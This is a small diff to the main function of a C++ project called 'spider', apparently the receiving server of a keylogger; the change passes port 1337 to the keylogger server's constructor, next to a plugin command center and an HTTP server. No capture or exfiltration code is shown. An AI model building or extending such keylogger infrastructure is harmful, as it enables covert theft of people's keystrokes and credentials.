@@ -36,7 +36,7 @@ int main()
   spider::server::CommandCenter cmdCenter("./plugins");
 
   // Create keylogger server
-  spider::server::SpiderServer keyloggerServer(cmdCenter, running);
+  spider::server::SpiderServer keyloggerServer(cmdCenter, running, 1337);
 
   // Create controllers here
   spider::http::WebServer httpServer(cmdCenter, running);
